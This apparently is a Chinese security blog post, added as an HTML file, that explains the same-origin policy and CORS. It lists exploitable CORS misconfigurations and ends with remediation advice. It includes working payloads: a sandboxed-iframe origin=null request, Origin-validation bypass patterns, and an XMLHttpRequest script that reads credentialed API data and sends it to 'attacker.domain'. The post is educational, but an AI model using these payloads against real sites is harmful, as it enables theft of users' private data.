@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        Threezh1&#39;Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            CORS原理及利用整理
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <!--Table of Contents begin-->
+        
+            <div id="toc" class="toc-article">
+            <strong class="toc-title">目录</strong>
+            <a class="js-toggle-toc" href="javascript:void(0)"></a>
+            <div class="toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5"><span class="toc-text">浏览器的同源策略</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%90%8C%E6%BA%90"><span class="toc-text">什么是同源</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E6%BA%90"><span class="toc-text">修改源</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%A8%E6%BA%90%E7%BD%91%E7%BB%9C%E8%AE%BF%E9%97%AE"><span class="toc-text">跨源网络访问</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CORS"><span class="toc-text">CORS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%A0%E7%A7%8D%E5%8F%AF%E8%83%BD%E5%88%A9%E7%94%A8%E7%9A%84CORS%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="toc-text">几种可能利用的CORS配置错误</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8EOrigin%E4%B8%8ECredentials%E5%80%BC%E4%B8%AD%E5%BE%97%E5%87%BA%E6%98%AF%E5%90%A6%E5%8F%AF%E5%88%A9%E7%94%A8"><span class="toc-text">从Origin与Credentials值中得出是否可利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%8F%91%E9%80%81origin-NULL%E7%9A%84%E8%AF%B7%E6%B1%82"><span class="toc-text">如何发送origin&#x3D;NULL的请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E7%BB%95%E8%BF%87%E7%9A%84%E5%9F%9F%E5%90%8D%E6%A0%A1%E9%AA%8C"><span class="toc-text">可绕过的域名校验</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E5%90%88XSS%E8%BF%9B%E8%A1%8C%E5%88%A9%E7%94%A8"><span class="toc-text">配合XSS进行利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%89%98%E7%AE%A1"><span class="toc-text">子域名托管</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Safari%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E7%89%B9%E6%AE%8A%E6%80%A7%E8%B4%A8"><span class="toc-text">Safari浏览器的特殊性质</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E4%B9%8BXMLHttpRequest%E5%8F%91%E5%8C%85"><span class="toc-text">利用之XMLHttpRequest发包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E4%B9%8BAjax-jquery%E5%8F%91%E5%8C%85"><span class="toc-text">利用之Ajax - jquery发包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%A0%E7%A7%8D%E6%A3%80%E9%AA%8C%E4%B8%8E%E5%88%A9%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7"><span class="toc-text">几种检验与利用的工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E5%BD%95"><span class="toc-text">附录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XMLHttpRequest"><span class="toc-text">XMLHttpRequest</span></a></li></ol></li></ol>
+            </div>
+            </div>
+        
+        <!--Table of Contents end -->
+        <p>刚入门的时候也学习过CORS，那个时候的对寻找漏洞的标准是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">修改&#96;Origin:&#96;，使得返回的HTTP字段中的&#96;Access-Control-Allow-Origin: &#96;出现你所输入的值，表明此网站存在CSOR漏洞</span><br></pre></td></tr></table></figure>
+
+<p>原理、利用、绕过都没有进一步了解。这次趁着实习的机会，好好的将CORS相关知识总结一下，并对一些基本原理进行一个梳理。</p>
+<a id="more"></a>
+
+<h2 id="浏览器的同源策略"><a href="#浏览器的同源策略" class="headerlink" title="浏览器的同源策略"></a>浏览器的同源策略</h2><h3 id="什么是同源"><a href="#什么是同源" class="headerlink" title="什么是同源"></a>什么是同源</h3><p>当两个页面是同源的时候，资源是可以直接进行交互的。但当两个页面来自不同的源却也想进行资源交互的话，就受到了同源策略的约束。那<strong>同源策略</strong>就是限制了从同一个源加载的文档或脚本如何与来自另一个源的资源进行交互。我们先来看看什么是同源。比如说有一个地址是：<a target="_blank" rel="noopener" href="http://threezh1.com/hello.html%EF%BC%8C%E9%82%A3%E5%AF%B9%E4%BA%8E%E4%B8%8B%E6%96%B9%E7%9A%84URL%E6%9D%A5%E8%AF%B4%EF%BC%8C%E5%90%8C%E6%BA%90%E8%BF%98%E6%98%AF%E4%B8%8D%E5%90%8C%E6%BA%90%E5%91%A2%EF%BC%9F">http://threezh1.com/hello.html，那对于下方的URL来说，同源还是不同源呢？</a></p>
+<table>
+<thead>
+<tr>
+<th>URL</th>
+<th align="center">是否同源</th>
+<th>原因</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a target="_blank" rel="noopener" href="http://threezh1.com/world.html">http://threezh1.com/world.html</a></td>
+<td align="center">同源</td>
+<td>只有路径不同</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="http://threezh1.com/temp/world.html">http://threezh1.com/temp/world.html</a></td>
+<td align="center">同源</td>
+<td>只有路径不同</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://threezh1.com/temp/world.html">https://threezh1.com/temp/world.html</a></td>
+<td align="center">不同源</td>
+<td>协议不同(http/https)</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="http://threezh1.com:8080/temp/world.html">http://threezh1.com:8080/temp/world.html</a></td>
+<td align="center">不同源</td>
+<td>端口不同</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="http://api.threezh1.com/temp/world.html">http://api.threezh1.com/temp/world.html</a></td>
+<td align="center">不同源</td>
+<td>域名不同</td>
+</tr>
+</tbody></table>
+<p>从表格中我们得出，两个页面，如果端口和主机都相同，则我们称这两个页面同源。除此之外，在页面中用 <code>about:blank</code> 或 <code>javascript:</code> URL 执行的脚本会继承打开该 URL 的页面的源。(IE未将端口加入到同源策略的组成部分之中)</p>
+<h3 id="修改源"><a href="#修改源" class="headerlink" title="修改源"></a>修改源</h3><p>页面可能会因为某些原因而需要改变自身的源，那该怎么进行修改呢？页面可以通过将脚本的<code>document.domain</code>设置为当前域或者当前域的父域来进行修改源的操作，比如说，现在页面处在<code>http://api.threezh1.com/temp/world.html</code>，它现在的源是<code>api.threezh1.com</code>，如果我想要修改它的源为<code>threezh1.com</code>，也就是它的父域，就需要执行下面的语句：(Ps：修改源不能修改为除了自身域和父域之外的源)</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.domain = <span class="string">&quot;threezh1.com&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="跨源网络访问"><a href="#跨源网络访问" class="headerlink" title="跨源网络访问"></a>跨源网络访问</h3><p>刚刚说到，同源策略约束着不同源的资源交互。例如XMLHttpRequest和Fetch API的使用就遵循同源策略。这些交互大概分为以下三类：</p>
+<ul>
+<li>跨域写操作（Cross-origin writes）：例如链接（links），重定向以及表单提交。<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ebd498cc3c52">非简单请求</a>需要添加 preflight(发送一个OPTIONS请求) </li>
+<li>跨域资源嵌入（Cross-origin embedding）：<code>&lt;script&gt;</code>嵌入跨域脚本、<code>&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;</code>嵌入css、<code>&lt;img&gt;</code>嵌入图片、<code>&lt;iframe&gt;</code>载入资源等等</li>
+<li>跨域读操作（Cross-origin reads）</li>
+</ul>
+<p>前两项通常是被运行的，而跨域读通常是不被允许的，那该如何允许跨源访问呢？这时候CORS就发挥出它的作用了。</p>
+<h2 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h2><p>跨域资源共享(CORS) 是一种机制，通过定义额外的HTTP头来使浏览器能够允许不同源之间的资源交互。这些HTTP头包括哪些呢？</p>
+<p><strong>HTTP 请求首部字段</strong></p>
+<ul>
+<li><code>Origin: &lt;origin&gt;</code> 表明预检请求或实际请求的源站。</li>
+</ul>
+<p>用于预检请求的HTTP请求首部字段（<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wonyun/p/CORS_preflight.html">CORS预检请求详谈</a>）：</p>
+<ul>
+<li><code>Access-Control-Request-Method: &lt;method&gt;</code> 用于预检请求。其作用是。将实际请求所使用的 HTTP 方法告诉服务器。</li>
+<li><code>Access-Control-Request-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]*</code>用于预检请求。其作用是，将实际请求所携带的首部字段告诉服务器。</li>
+</ul>
+<p><strong>HTTP 响应首部字段</strong></p>
+<ul>
+<li><code>Access-Control-Allow-Origin: &lt;origin&gt; | *</code>  origin 参数的值指定了允许访问该资源的外域 URI。对于不需要携带身份凭证的请求，服务器可以指定该字段的值为通配符，表示允许来自所有域的请求。</li>
+<li><code>Access-Control-Expose-Headers: X-My-Custom-Header, X-Another-Custom-Header</code> 让服务器把允许浏览器访问的头放入白名单，XMLHttpRequest对象就能够通过getResponseHeader访问到 <code>X-My-Custom-Header</code>和 <code>X-Another-Custom-Header</code> 响应头了。</li>
+<li><code>Access-Control-Max-Age: &lt;delta-seconds&gt;</code> 指定了preflight请求的结果能够被缓存多久</li>
+<li><code>Access-Control-Allow-Credentials: true</code> 指定了当浏览器的<code>credentials</code>设置为true时是否允许浏览器读取response的内容。</li>
+</ul>
+<p>用于预检请求的HTTP响应首部字段：</p>
+<ul>
+<li><code>Access-Control-Allow-Methods: &lt;method&gt;[, &lt;method&gt;]*</code> 用于预检请求的响应。其指明了实际请求所允许使用的 HTTP 方法。</li>
+<li><code>Access-Control-Allow-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]*</code> 用于预检请求的响应。其指明了实际请求中允许携带的首部字段。</li>
+</ul>
+<p><strong>一个简单的例子：</strong></p>
+<p>这里跳过了预检请求，并且数据包也简化了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">请求数据包：</span><br><span class="line">POST &#x2F;resources&#x2F;post-here&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Origin: http:&#x2F;&#x2F;foo.example.com</span><br><span class="line"></span><br><span class="line">[post data]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;foo.example.com</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line"></span><br><span class="line">[result]</span><br></pre></td></tr></table></figure>
+
+<p>从上面的请求中可以看得出来，foo.example.com向example.com发送跨域请求，并且成功获取到数据。</p>
+<p>具体HTTP请求与响应例子请参考：<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS">HTTP访问控制（CORS）</a></p>
+<h2 id="几种可能利用的CORS配置错误"><a href="#几种可能利用的CORS配置错误" class="headerlink" title="几种可能利用的CORS配置错误"></a>几种可能利用的CORS配置错误</h2><p>这里主要记录一下关于CORS漏洞的几种情况以及利用方式，漏洞利用的最终目的是用户只要访问到一个攻击页面就可以获取到用的敏感信息。(还有可以进行缓存投毒，利用面太小就不作记录了) 因为搭建环境复现比较麻烦，这里就不复现一些情况的例子了，打算等在实际情况中遇到再来补充。</p>
+<h3 id="从Origin与Credentials值中得出是否可利用"><a href="#从Origin与Credentials值中得出是否可利用" class="headerlink" title="从Origin与Credentials值中得出是否可利用"></a>从Origin与Credentials值中得出是否可利用</h3><table>
+<thead>
+<tr>
+<th>“Access-Control-Allow-Origin” 值</th>
+<th>“Access-Control-Allow-Credentials” 值</th>
+<th>是否可利用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a target="_blank" rel="noopener" href="https://attacker.com/">https://attacker.com</a></td>
+<td>true</td>
+<td>是</td>
+</tr>
+<tr>
+<td>null</td>
+<td>true</td>
+<td>是</td>
+</tr>
+<tr>
+<td>*</td>
+<td>true</td>
+<td>否</td>
+</tr>
+</tbody></table>
+<p>当然，可以利用的情况不会那么简单。大部分时候是origin的域名部分被校验。所以需要总结一下CORS域名限制的几种绕过。</p>
+<h3 id="如何发送origin-NULL的请求"><a href="#如何发送origin-NULL的请求" class="headerlink" title="如何发送origin=NULL的请求"></a>如何发送origin=NULL的请求</h3><p>当遇到一个cors可用null值绕过时，用iframe配合data协议，就可以发送一个origin为null的请求。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">sandbox</span>=<span class="string">&quot;allow-scripts allow-top-navigation allow-forms&quot;</span> <span class="attr">src</span>=<span class="string">&#x27;data:text/html,&lt;script&gt;var req=new XMLHttpRequest();req.onload=reqListener;req.open(&quot;get&quot;,&quot;http://127.0.0.1/test.html&quot;,true);req.withCredentials=true;req.send();function reqListener()&#123;alert(this.responseText)&#125;;&lt;/script&gt;&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="可绕过的域名校验"><a href="#可绕过的域名校验" class="headerlink" title="可绕过的域名校验"></a>可绕过的域名校验</h3><p>当域名校验不是特别严格时，可以通过以下几种方式进行绕过：</p>
+<ul>
+<li>在后面加域名    qq.com =&gt; qq.com.abc.com    </li>
+<li>将域名拼接       abc.qq.com =&gt; abc_qq.com</li>
+<li>在前面或者在后面加字符 qq.com =&gt; abcqq.com / qq.com =&gt; qq.comabc.com</li>
+</ul>
+<h3 id="配合XSS进行利用"><a href="#配合XSS进行利用" class="headerlink" title="配合XSS进行利用"></a>配合XSS进行利用</h3><p>当同源网站中存在一个xss漏洞时，就可以直接使用xss包含cors的payload进行利用。</p>
+<h3 id="子域名托管"><a href="#子域名托管" class="headerlink" title="子域名托管"></a>子域名托管</h3><p>通过托管一个子域名，可以直接使用子域名或者通过降域来利用，这里只作了解。</p>
+<h3 id="Safari浏览器的特殊性质"><a href="#Safari浏览器的特殊性质" class="headerlink" title="Safari浏览器的特殊性质"></a>Safari浏览器的特殊性质</h3><p>当遇到这样的正则表达式所校验的域名时：(允许所有“target.local”的子域名的跨域请求，并且这些请求可以来自于子域名的任意端口)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^https?:\&#x2F;\&#x2F;(.*\.)?target.local([^\.\-a-zA-Z0-9]+.*)?</span><br></pre></td></tr></table></figure>
+
+<p>可以使用：<code>http://www.target.local&#123;.example.com</code>进行绕过。只需要配置example.com所有子域名的DNS都解析到同一处即可。这种情况基本只出现在Safari浏览器当中。</p>
+<p>其他可以利用的字符：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">,&amp;&#39;&quot;;!$^*()+&#x3D;&#96;~-_&#x3D;|&#123;&#125;%</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; non printable chars</span><br><span class="line">%01-08,%0b,%0c,%0e,%0f,%10-%1f,%7f</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用之XMLHttpRequest发包"><a href="#利用之XMLHttpRequest发包" class="headerlink" title="利用之XMLHttpRequest发包"></a>利用之XMLHttpRequest发包</h3><p>方式一：直接作为参数传递到自己搭建的网址</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> req = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">req.onload = reqListener;</span><br><span class="line">req.open(<span class="string">&quot;get&quot;</span>,<span class="string">&quot;https://vulnerable.domain/api/private-data&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">req.withCredentials = <span class="literal">true</span>;</span><br><span class="line">req.send();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reqListener</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">location=<span class="string">&quot;//attacker.domain/log?response=&quot;</span>+<span class="built_in">this</span>.responseText;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>方式二：写入到当前网页的文本框</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cors</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line"><span class="keyword">var</span> xhttp = <span class="keyword">new</span> XMLHttpRequest();  </span><br><span class="line">xhttp.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;    </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.status == <span class="number">200</span>) &#123;    </span><br><span class="line">    alert(<span class="built_in">this</span>.responseText);     </span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&quot;demo&quot;</span>).innerHTML = <span class="built_in">this</span>.responseText;    </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;;  </span><br><span class="line">xhttp.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;https://www.redacted.com/api/return&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">xhttp.withCredentials = <span class="literal">true</span>;  </span><br><span class="line">xhttp.send();</span><br><span class="line">&#125;</span><br><span class="line">cors();</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用之Ajax-jquery发包"><a href="#利用之Ajax-jquery发包" class="headerlink" title="利用之Ajax - jquery发包"></a>利用之Ajax - jquery发包</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://0535code.com/wp-content/themes/d8/js/jquery.js?ver=3.0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span>  </span><br><span class="line"><span class="javascript"><span class="keyword">var</span> url =<span class="string">&quot;http://0535code.com/&quot;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//装入页面</span></span></span><br><span class="line"><span class="javascript">$(<span class="built_in">window</span>).load(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line">  start();</span><br><span class="line">&#125;); </span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">  $.ajax(&#123;</span></span><br><span class="line">           url:url,</span><br><span class="line"><span class="javascript">           type:<span class="string">&quot;POST&quot;</span>,</span></span><br><span class="line"><span class="javascript">           success:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;<span class="comment">//ajax返回的数据</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//var result = data;</span></span></span><br><span class="line"><span class="javascript">            <span class="comment">//alert(result);</span></span></span><br><span class="line">           &#125;,</span><br><span class="line">      &#125;); </span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="几种检验与利用的工具"><a href="#几种检验与利用的工具" class="headerlink" title="几种检验与利用的工具"></a>几种检验与利用的工具</h3><ul>
+<li>Brupsuite自带cors检验，但误报率较高</li>
+<li>X-ray检测</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/chenjj/CORScanner">CORScanner</a></li>
+</ul>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul>
+<li>避免使用CORS</li>
+<li>定义白名单</li>
+<li>使用安全的协议</li>
+<li>配置”VARY”头部</li>
+<li>避免使用“CREDENTIALS”</li>
+<li>合理配置”Access-Control-Allow-Methods”</li>
+<li>限制缓存的时间</li>
+<li>仅配置所需要的头</li>
+</ul>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy">浏览器的同源策略</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2745">cors安全完全指南</a></li>
+<li><a target="_blank" rel="noopener" href="https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397">Think Outside the Scope: Advanced CORS Exploitation Techniques</a></li>
+</ul>
+<h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><h3 id="XMLHttpRequest"><a href="#XMLHttpRequest" class="headerlink" title="XMLHttpRequest"></a>XMLHttpRequest</h3><p>AJAX是异步的JavaScript和XML，就是使用XMLHttpRequest对象与服务器通信。那具体该怎么发送http请求呢？下面是一个简单的例子，对test.html发送GET请求，并获取其返回的内容后弹窗：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;ajaxButton&quot;</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span>&gt;</span>Make a request<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> httpRequest;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// click事件绑定</span></span></span><br><span class="line"><span class="javascript">	<span class="built_in">document</span>.getElementById(<span class="string">&quot;ajaxButton&quot;</span>).addEventListener(<span class="string">&quot;click&quot;</span>, makeRequest); </span></span><br><span class="line"><span class="javascript">	<span class="function"><span class="keyword">function</span> <span class="title">makeRequest</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">		<span class="comment">// 创建一个XMLHttpRequest对象</span></span></span><br><span class="line"><span class="javascript">		httpRequest = <span class="keyword">new</span> XMLHttpRequest(); </span></span><br><span class="line"><span class="javascript">		<span class="keyword">if</span> (!httpRequest) &#123;</span></span><br><span class="line"><span class="javascript">			alert(<span class="string">&quot;Fail to create an XMLHttpRequest!&quot;</span>);</span></span><br><span class="line"><span class="javascript">			<span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="javascript">		<span class="comment">// 请求状态发生改变时的事件绑定</span></span></span><br><span class="line">		httpRequest.onreadystatechange = alertContents; </span><br><span class="line"><span class="javascript">		<span class="comment">// 对test.html发送get请求</span></span></span><br><span class="line"><span class="javascript">		httpRequest.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;test.html&quot;</span>); </span></span><br><span class="line"><span class="javascript">		<span class="comment">// 发送数据，这里是Get请求，所以参数为空。如果是POST请求，参数内容就应该为POST数据</span></span></span><br><span class="line">		httpRequest.send() </span><br><span class="line">	&#125;</span><br><span class="line"><span class="javascript">	<span class="function"><span class="keyword">function</span> <span class="title">alertContents</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">		<span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="javascript">			<span class="keyword">if</span> (httpRequest.readyState == XMLHttpRequest.DONE) &#123;</span></span><br><span class="line"><span class="javascript">				<span class="keyword">if</span> (httpRequest.status == <span class="number">200</span>) &#123;</span></span><br><span class="line">					alert(httpRequest.responseText);</span><br><span class="line"><span class="javascript">				&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">					alert(<span class="string">&quot;There are some problem with the reuqest!&quot;</span>);</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"><span class="javascript">		&#125; <span class="keyword">catch</span>(e) &#123;</span></span><br><span class="line"><span class="javascript">			alert(<span class="string">&#x27;Caught Exception: &#x27;</span> + e.description);</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上方只是一个简单的Get请求，那如果想要发送POST请求并传递一些参数该怎么做呢？来看下方这个例子(部分节选)：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">httpRequest.open(<span class="string">&#x27;POST&#x27;</span>, url);</span><br><span class="line">httpRequest.setRequestHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>);</span><br><span class="line">httpRequest.send(<span class="string">&#x27;userName=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(userName));</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，类型从GET改成了POST，并且设置了一个http header。这里需要注意的是，在进行POST请求时，需要根据要发送的数据设置请求的MIME类型。一般为以下几种类型：</p>
+<ul>
+<li>application/x-www-form-urlencoded   表示在发送前编码所有字符（默认）</li>
+<li>multipart/form-data      不对字符编码。在使用包含文件上传控件的表单时，必须使用该值。</li>
+<li>text/plain      空格转换为 “+” 加号，但不对特殊字符编码。</li>
+<li>text/html       超文本标记语言文本</li>
+</ul>
+<p>除了GET和POST请求的不同之外，XMLHTTPRequest.readyState有这么一些值代表着特别的含义：</p>
+<ul>
+<li>0 (未初始化) or (请求还未初始化)</li>
+<li>1 (正在加载) or (已建立服务器链接)</li>
+<li>2 (加载成功) or (请求已接受)</li>
+<li>3 (交互) or (正在处理请求)</li>
+<li>4 (完成) or (请求已完成并且响应已准备好)</li>
+</ul>
